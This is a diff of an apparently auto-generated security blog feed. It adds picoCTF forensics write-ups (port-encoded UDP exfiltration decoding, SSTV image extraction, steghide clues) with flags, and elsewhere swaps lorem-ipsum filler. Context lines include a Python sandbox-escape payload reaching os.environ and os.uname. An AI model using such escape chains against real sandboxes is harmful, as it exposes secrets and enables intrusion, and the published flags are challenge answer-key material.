@@ -574,6 +574,36 @@ xxd garden.jpg | tail
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">done</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="shark-on-wire-2">shark on wire 2</h2>
+<p>There is a very Sick exfiltration technique:</p>
+<ol>
+<li>Follow UDP Stream and change stream until you find a stream that contains <strong>start</strong> (stream 32)</li>
+<li>Note the ip address and investigate with <code>ip.src == 10.0.0.66 and udp</code></li>
+<li>Note the port being used at each UDP packet is changing: [5112, 5105, 5099, 5111, 5067, 5084, 5070, &hellip;]</li>
+<li>remove 5000 to those port numbers, and you get ascii: [p, i, c, o, C, T, F, {, &hellip;]</li>
+</ol>
+<p>extract all the ports:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tshark  -r capture.pcap  <span style="color:#f1fa8c">&#34;ip.src == 10.0.0.66 and udp.port &gt; 5000&#34;</span> | awk <span style="color:#f1fa8c">&#39;{print $8}&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>then pass the output to a python console:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>n <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">5112</span>,<span style="color:#bd93f9">5105</span>,<span style="color:#bd93f9">5099</span>,<span style="color:#bd93f9">5111</span>,<span style="color:#bd93f9">5067</span>,<span style="color:#bd93f9">5084</span>,<span style="color:#bd93f9">5070</span>,<span style="color:#bd93f9">5123</span>,<span style="color:#bd93f9">5112</span>,<span style="color:#bd93f9">5049</span>,<span style="color:#bd93f9">5076</span>,<span style="color:#bd93f9">5076</span>,<span style="color:#bd93f9">5102</span>,<span style="color:#bd93f9">5051</span>,<span style="color:#bd93f9">5114</span>,<span style="color:#bd93f9">5051</span>,<span style="color:#bd93f9">5100</span>,<span style="color:#bd93f9">5095</span>,<span style="color:#bd93f9">5100</span>,<span style="color:#bd93f9">5097</span>,<span style="color:#bd93f9">5116</span>,<span style="color:#bd93f9">5097</span>,<span style="color:#bd93f9">5095</span>,<span style="color:#bd93f9">5118</span>,<span style="color:#bd93f9">5049</span>,<span style="color:#bd93f9">5097</span>,<span style="color:#bd93f9">5095</span>,<span style="color:#bd93f9">5115</span>,<span style="color:#bd93f9">5116</span>,<span style="color:#bd93f9">5051</span>,<span style="color:#bd93f9">5103</span>,<span style="color:#bd93f9">5048</span>,<span style="color:#bd93f9">5125</span>]
+</span></span><span style="display:flex;"><span>n <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">chr</span>(x<span style="color:#ff79c6">-</span><span style="color:#bd93f9">5000</span>) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> n]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(n))
+</span></span></code></pre></td></tr></table>
+</div>
 </div><h2 id="extensions">extensions</h2>
 <pre><code>curl -sLO https://jupiter.challenges.picoctf.org/static/e7e5d188621ee705ceeb0452525412ef/flag.txt
 file flag.txt
@@ -587,8 +617,77 @@ cat flag.txt.txt
 <pre><code>zsteg buildings.png | grep pico | cut -d'&quot;' -f2
 </code></pre>
 <h2 id="m00nwalk">m00nwalk</h2>
-<p>pass</p>
-<h2 id="whitepages">WhitePages</h2>
+<blockquote>
+<p>In 1996, NASA selected a RCA scan converter that provided input to convert its signals from eight Apollo missions, such as 7, 8, 9, 11, and 12.A camera on the Apollo TV television broadcast its raw unconverted SSTV signal, which is then passed along from one of the ground stations to another via the satellite phone.
+<a href="https://www.eclipseaviation.com/how-nasa-transfered-data-from-moon-landing/#0">https://www.eclipseaviation.com/how-nasa-transfered-data-from-moon-landing/#0</a></p>
+</blockquote>
+<p>Resources:</p>
+<ul>
+<li><a href="https://www.esa.int/ESA_Multimedia/Videos/2020/07/Mac_OSX_tutorial_How_to_receive_SSTV_pictures_from_the_International_Space_Station">SSTV Tutorial from ESA to visualise images from ISS - International Space Station</a></li>
+<li><a href="https://github.com/mattingalls/Soundflower/releases">Soundflower</a> gives the ability to your Macbook to listen to its own speaker to decode SSTV raw images</li>
+</ul>
+<p>Sadly, we cannot follow the tutorial because the software is no longer available, unless I purchase another software. This is why we need linux rather then MacOSX.
+I found an alternative python script that can decode the image from the wav file, without playing it:</p>
+<p>installation:</p>
+<pre tabindex="0"><code>git clone https://github.com/colaclanth/sstv
+python3 setup.py install
+</code></pre><p>Process the wav to extract the image:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -LO https://jupiter.challenges.picoctf.org/static/fc1edf07742e98a480c6aff7d2546107/message.wav
+</span></span><span style="display:flex;"><span>sstv -d message.wav -o result.png
+</span></span><span style="display:flex;"><span>open result.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>output:</p>
+<pre><code>[sstv] Searching for calibration header... Found!
+[sstv] Detected SSTV mode Scottie 1
+[sstv] Decoding image...
+[####################################################################################################] 100%
+[sstv] Drawing image data...
+[sstv] ...Done!
+</code></pre>
+<p>flag: picoCTF{beep_boop_im_in_space}</p>
+<h2 id="m00nwalk-2">m00nwalk 2</h2>
+<p>Download the clues:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i in <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">2</span> 3; <span style="color:#ff79c6">do</span> curl -LO https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue<span style="color:#8be9fd;font-style:italic">$i</span>.wav ; <span style="color:#ff79c6">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i in <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">2</span> 3; <span style="color:#ff79c6">do</span> sstv -d clue<span style="color:#8be9fd;font-style:italic">$i</span>.wav -o clue<span style="color:#8be9fd;font-style:italic">$i</span>.png ; <span style="color:#ff79c6">done</span>
+</span></span><span style="display:flex;"><span>open clue*png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>clue1 = Password hidden_stegosaurus</li>
+<li>clue2 = The quieter you are the more you can HEAR</li>
+<li>clue3 = Alan Eliasen the FutureBoy</li>
+</ul>
+<p>Searching for Alan Eliasen, we find a topic about Steganography on <a href="https://futureboy.us/stegano/decinput.html">https://futureboy.us/stegano/decinput.html</a> with an online decoder compatible with <strong><code>steghide</code></strong>
+These pages use the steghide program to perform steganography, and the files generated are fully compatible with steghide. If you really want to be secure, or do brute-force attacks, you&rsquo;ll want to use these programs on your own system.</p>
+<p>process the message.wav with the password, and you get the Flag in plaintext.
+Flag: picoCTF{the_answer_lies_hidden_in_plain_sight}</p>
+<p>Extract the image from the transmission:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -LO https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/message.wav
+</span></span><span style="display:flex;"><span>sstv -d message.wav -o result.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="whitepages">WhitePages</h2>
 <pre><code>file whitepages.txt
 whitepages.txt: UTF-8 Unicode text, with very long lines, with no line terminators
 </code></pre>
@@ -732,11 +831,11 @@ the first eight bytes of a PNG file always contain the following values:</p>
 <tbody>
 <tr>
 <td>(hexadecimal)</td>
-<td>89  50  4e  47  0d  0a  1a  0a</td>
+<td>89 50 4e 47 0d 0a 1a 0a</td>
 </tr>
 <tr>
 <td>(ASCII C notation)</td>
-<td>\211   P   N   G  \r  \n \032 \n</td>
+<td>\211 P N G \r \n \032 \n</td>
 </tr>
 </tbody>
 </table>
@@ -883,7 +982,7 @@ this particular chunk has this structure:</p>
 <td>0000 1625</td>
 </tr>
 <tr>
-<td>Unit specifier:          1 byte</td>
+<td>Unit specifier: 1 byte</td>
 <td>0x1</td>
 </tr>
 </tbody>
@@ -961,7 +1060,7 @@ and does not exist in the spec; The closest that comes to mind when comparing wi
 </tbody>
 </table>
 <p>We can obtain the true size of the IDAT chunk if we can find the offset of the next chunk.
-The next chunk is either another <code>IDAT </code> or an <code>IEND</code> chunk of size zero,  which terminates the file:</p>
+The next chunk is either another <code>IDAT </code> or an <code>IEND</code> chunk of size zero, which terminates the file:</p>
 <pre tabindex="0"><code>xxd mystery-patched | grep IDAT
 00000050: 5224 f000 0318 4b49 4441 5478 5eec bd3f  R$....KIDATx^..?
 00010000: 6927 db59 0000 fff4 4944 4154 3697 4678  i&#39;.Y....IDAT6.Fx
@@ -8327,8 +8426,8 @@ Nmap scan report for wpad.corporate-domain.com (10.197.243.31)
 Nmap scan report for ns.corporate-domain.com (10.197.243.77)
 Nmap done: 256 IP addresses (0 hosts up) scanned in 0.13 seconds
 </code></pre>
-]]></content></item><item><title>Responder to Capture Domain Hashes</title><link>https://0xade1.github.io/posts/2021/10/responder-to-capture-domain-hashes/</link><pubDate>Wed, 13 Oct 2021 22:11:33 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/responder-to-capture-domain-hashes/</guid><description>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</description><content type="html">
-&lt;p>&lt;em>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.&lt;/em>&lt;/p></content></item><item><title>Don't overlook Snmp Mibs Exploration</title><link>https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/</link><pubDate>Sun, 03 Oct 2021 09:51:16 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/</guid><description>UDP Scan Snmp is among the top 10 ports in nmap UDP scan. The main problem with UDP is that it may not reply to our nmap probes resulting in open|filtered result. It is recommended to use the -sV which may reveal an open port as shown below. Another interesting option is -sC to run common scripts and obtain for example process table or netstat table &amp;hellip;
+]]></content></item><item><title>Responder to Capture Domain Hashes</title><link>https://0xade1.github.io/posts/2021/10/responder-to-capture-domain-hashes/</link><pubDate>Wed, 13 Oct 2021 22:11:33 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/responder-to-capture-domain-hashes/</guid><description>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est.</description><content type="html">
+&lt;p>&lt;em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.&lt;/em>&lt;/p></content></item><item><title>Don't overlook Snmp Mibs Exploration</title><link>https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/</link><pubDate>Sun, 03 Oct 2021 09:51:16 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/</guid><description>UDP Scan Snmp is among the top 10 ports in nmap UDP scan. The main problem with UDP is that it may not reply to our nmap probes resulting in open|filtered result. It is recommended to use the -sV which may reveal an open port as shown below. Another interesting option is -sC to run common scripts and obtain for example process table or netstat table &amp;hellip;
 sudo nmap -sU -sV -sC --top-ports 10 10.</description><content type="html"><![CDATA[<p><img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ibb.co%2FGpRn5gn%2Ftcpvsudp.jpg&amp;f=1&amp;nofb=1" alt="udp vs tcp"></p>
 <h2 id="udp-scan">UDP Scan</h2>
 <p>Snmp is among the top 10 ports in nmap UDP scan. The main problem with UDP is that it may not reply to our nmap probes resulting in <code>open|filtered</code> result. It is recommended to use the <code>-sV</code> which may reveal an <code>open</code> port as shown below. Another interesting option is <code>-sC</code> to run common scripts and obtain for example process table or netstat table &hellip;</p>
@@ -9841,8 +9940,8 @@ Have you actually, once in your life, seriously read one with all the attention 
 <p>Remember Cambridge Analytica? No Facebook users ever heard of or knew that this third-party company was harvesting their most private data to profile users and influence election. That was lawfully possible thanks to Facebook Terms and Conditions. If I trust Facebook, does it mean I have to trust any of its third parties?</p>
 <p>With some media propaganda and Public Relationship magic, all the blame was thrown-away by Facebook onto this British company and its holding who did not survive its reputation loss. While Facebook on the other hand was almost totally waived of its responsibility in the opinion. If I give my money to a bank and this bank looses my money because of its third-party committing a crime or a fraud, well I have no knowledge of this third-party, any clause waiving the bank of its responsibility can be considered abusive in court, and I am rightfully keeping the bank fully accountable to recover my assets and liable for any damages it causes. Sadly it does not work the same with Data mishandling or data breaches.</p>
 <h2 id="rgpd-brings-a-lot-of-improvements-to-customer-rights">RGPD brings a lot of improvements to customer rights</h2>
-]]></content></item><item><title>Test3</title><link>https://0xade1.github.io/posts/2021/09/test3/</link><pubDate>Sun, 26 Sep 2021 20:32:30 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/test3/</guid><description>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue.</description><content type="html">
-&lt;p>&lt;em>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue. Maecenas ut molestie eros. Quisque eleifend pharetra dui, sed lacinia mauris iaculis a. Donec vel venenatis nulla, non dignissim dui. Curabitur in nisi nec felis dictum ultrices sit amet quis augue.&lt;/em>&lt;/p></content></item><item><title>How I built this privacy friendly blog</title><link>https://0xade1.github.io/posts/2021/09/how-i-built-this-privacy-friendly-blog/</link><pubDate>Sun, 26 Sep 2021 11:28:33 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/how-i-built-this-privacy-friendly-blog/</guid><description>Why I built this blog Social Media dominant ideology is corrupting people thoughts In an increasingly manicheist world loosing its sense of shades and scales of Tolerance towards extremes sides, I found difficult to publicly express my view of facts and events that may contradicts dominant ideology. I was looking for a way to post my opinions and thoughts online while avoiding the new norm of social media pressure that systematically judges you according to some political prism or psychological bias.</description><content type="html"><![CDATA[<h2 id="why-i-built-this-blog">Why I built this blog</h2>
+]]></content></item><item><title>Test3</title><link>https://0xade1.github.io/posts/2021/09/test3/</link><pubDate>Sun, 26 Sep 2021 20:32:30 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/test3/</guid><description>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</description><content type="html">
+&lt;p>&lt;em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.&lt;/em>&lt;/p></content></item><item><title>How I built this privacy friendly blog</title><link>https://0xade1.github.io/posts/2021/09/how-i-built-this-privacy-friendly-blog/</link><pubDate>Sun, 26 Sep 2021 11:28:33 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/how-i-built-this-privacy-friendly-blog/</guid><description>Why I built this blog Social Media dominant ideology is corrupting people thoughts In an increasingly manicheist world loosing its sense of shades and scales of Tolerance towards extremes sides, I found difficult to publicly express my view of facts and events that may contradicts dominant ideology. I was looking for a way to post my opinions and thoughts online while avoiding the new norm of social media pressure that systematically judges you according to some political prism or psychological bias.</description><content type="html"><![CDATA[<h2 id="why-i-built-this-blog">Why I built this blog</h2>
 <h3 id="social-media-dominant-ideology-is-corrupting-people-thoughts">Social Media dominant ideology is corrupting people thoughts</h3>
 <p>In an increasingly manicheist world loosing its sense of shades and scales of Tolerance towards extremes sides,
 I found difficult to publicly express my view of facts and events that may contradicts dominant ideology.
@@ -17304,13 +17403,13 @@ w1     | old fp                 |
 ]]></content></item><item><title>picoCTF 2021 - Web Exploitation</title><link>https://0xade1.github.io/posts/2021/08/picoctf-2021-web-exploitation/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://0xade1.github.io/posts/2021/08/picoctf-2021-web-exploitation/</guid><description>GET aHEAD curl -is -X HEAD http://mercury.picoctf.net:34561/index.php | grep flag | cut -d' ' -f2</description><content type="html"><![CDATA[<h2 id="get-ahead">GET aHEAD</h2>
 <pre><code>curl -is -X HEAD http://mercury.picoctf.net:34561/index.php | grep flag | cut -d' ' -f2
 </code></pre>
-]]></content></item><item><title>Vim as a first choice Python IDE</title><link>https://0xade1.github.io/posts/2021/02/vim-as-a-first-choice-python-ide/</link><pubDate>Thu, 11 Feb 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/02/vim-as-a-first-choice-python-ide/</guid><description>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor.</description><content type="html"><![CDATA[
+]]></content></item><item><title>Vim as a first choice Python IDE</title><link>https://0xade1.github.io/posts/2021/02/vim-as-a-first-choice-python-ide/</link><pubDate>Thu, 11 Feb 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/02/vim-as-a-first-choice-python-ide/</guid><description>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est.</description><content type="html"><![CDATA[
 
 
 
 
 
-  <p><em>Suspendisse in ligula convallis, maximus metus et, cursus velit. Aenean nec massa volutpat, lacinia lacus sit amet, tempus tellus. Etiam aliquet, est at volutpat faucibus, libero lectus ultrices leo, et tempus mi est eu quam. Nulla facilisi. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Curabitur mollis purus vel felis facilisis, eu placerat dui posuere. Ut orci arcu, hendrerit vitae eros et, maximus pellentesque leo. Sed ultrices, metus quis commodo mattis, dui eros rhoncus erat, ac pharetra purus ipsum eu tortor. Sed id tortor et neque viverra faucibus. Phasellus sem felis, tincidunt gravida vestibulum eu, lobortis eget nulla. Cras pharetra neque vitae ullamcorper eleifend. Etiam sagittis rhoncus dapibus. Donec ultrices odio at lectus egestas mollis. Cras lacus est, ultrices eget gravida eu, porttitor vel risus. Fusce eu erat in risus congue elementum quis non ante. Ut in interdum felis.</em></p>
+  <p><em>Integer tristique mattis condimentum. Pellentesque sit amet mauris malesuada, volutpat nunc ultrices, molestie massa. Nulla sit amet sem id erat ornare tincidunt eu id neque. Phasellus imperdiet, leo nec ultricies feugiat, augue elit pharetra mauris, ut porttitor mauris est non enim. Sed in quam nec turpis lacinia faucibus. Nulla semper lorem eget magna porta, eget pellentesque arcu finibus. Suspendisse nec nisl ac sapien gravida tincidunt ut et diam. Mauris suscipit, erat ut bibendum venenatis, nulla nibh tempor justo, nec bibendum velit mauris sed est. Pellentesque nec elit eget arcu mollis semper vel ut erat. Sed orci eros, vehicula eu dolor ut, vehicula eleifend purus. Maecenas id augue ut quam volutpat sodales. Nullam rhoncus urna nec quam tincidunt scelerisque. Morbi vehicula egestas ex, vitae auctor libero tristique id. Vivamus in leo id mi placerat lobortis.</em></p>
 
 
 
@@ -35045,14 +35144,15 @@ some more fun
 ''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').environ
 ''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').uname()
 </code></pre>
-]]></content></item><item><title>test 2</title><link>https://0xade1.github.io/posts/2021/01/test-2/</link><pubDate>Fri, 29 Jan 2021 20:15:44 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/01/test-2/</guid><description>Intro Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</description><content type="html"><![CDATA[<h1 id="intro">Intro</h1>
+]]></content></item><item><title>test 2</title><link>https://0xade1.github.io/posts/2021/01/test-2/</link><pubDate>Fri, 29 Jan 2021 20:15:44 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/01/test-2/</guid><description>Intro Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.
+Title 1 Sed consectetur enim non erat mattis pretium.</description><content type="html"><![CDATA[<h1 id="intro">Intro</h1>
 
 
 
 
 
 
-  <p><em>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</em></p>
+  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>
 
 
 
@@ -35063,11 +35163,11 @@ some more fun
 
 
 
